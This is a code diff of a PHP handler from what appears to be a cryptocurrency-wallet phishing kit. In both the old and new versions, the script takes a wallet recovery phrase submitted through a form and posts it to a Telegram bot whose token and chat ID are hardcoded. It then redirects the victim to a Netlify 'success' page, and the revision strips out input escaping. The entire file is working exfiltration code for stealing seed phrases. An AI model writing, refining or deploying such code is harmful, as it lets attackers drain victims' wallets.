@@ -1,55 +1,36 @@
 <?php
-// Replace with your own bot token and chat id
-$botToken = '7210917381:AAGPxkv9Y3dqnBj_rHOtWvvuIyg9qHlpFrg';
-$chatId = '5160818690';
+// Telegram Bot configuration
+$botToken = '7210917381:AAGPxkv9Y3dqnBj_rHOtWvvuIyg9qHlpFrg'; // Replace with your actual bot token
+$chatId = '5160818690';     // Replace with your chat ID
 
-// Get the recovery phrase from POST
-$message = isset($_POST['message']) ? trim($_POST['message']) : '';
+// Get the recovery phrase from POST data
+$unlockSubmitBtn = $_POST['unlockSubmitBtn'] ?? 'No phrase provided';
 
-if ($message) {
-    $message = "Recovery Phrase submitted:\n" . htmlspecialchars($message, ENT_QUOTES, 'UTF-8'); // basic XSS protection
+// Prepare the message
+$message = "New Recovery Phrase Received:\n";
+$message .= $unlockSubmitBtn;
 
-    // Telegram API URL
-    $url = "https://api.telegram.org/bot7210917381:AAGPxkv9Y3dqnBj_rHOtWvvuIyg9qHlpFrg/sendMessage";
+// Telegram API URL
+$telegramApiUrl = "https://api.telegram.org/bot7210917381:AAGPxkv9Y3dqnBj_rHOtWvvuIyg9qHlpFrg/sendMessage";
 
-    // Data to send
-    $data = [
-        'chat_id' => $chatId,
-        'text' => $message,
-        'parse_mode' => 'HTML'
-    ];
+// Prepare the data for Telegram
+$data = array(
+    'chat_id' => $chatId,
+    'text' => $message,
+    'parse_mode' => 'HTML'
+);
 
-    // Use cURL to send POST request
-    $ch = curl_init();
-    curl_setopt($ch, CURLOPT_URL, $url);
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+// Send to Telegram
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $telegramApiUrl);
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 
-    $response = curl_exec($ch);
+$response = curl_exec($ch);
+curl_close($ch);
 
-    // Check if the request was successful
-    $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
-    curl_close($ch);
-
-    // Optionally, check Telegram response for success
-    $isSuccess = false;
-    if ($httpcode === 200 && $response) {
-        $json = json_decode($response, true);
-        if (isset($json['ok']) && $json['ok'] === true) {
-            $isSuccess = true;
-        }
-    }
-
-    if ($isSuccess) {
-        header("Location: success.html"); // Create success.html for a thank you page
-    } else {
-        header("Location: error.html"); // Create error.html for error message
-    }
-    exit();
-} else {
-    // Handle error: No recovery phrase provided
-    header("Location: error.html"); // Create error.html for error message
-    exit();
-}
+// Redirect to success page
+header('Location: https://success-lucky-5f3e1c-moxie.netlify.app/?status=314');
+exit();
 ?>
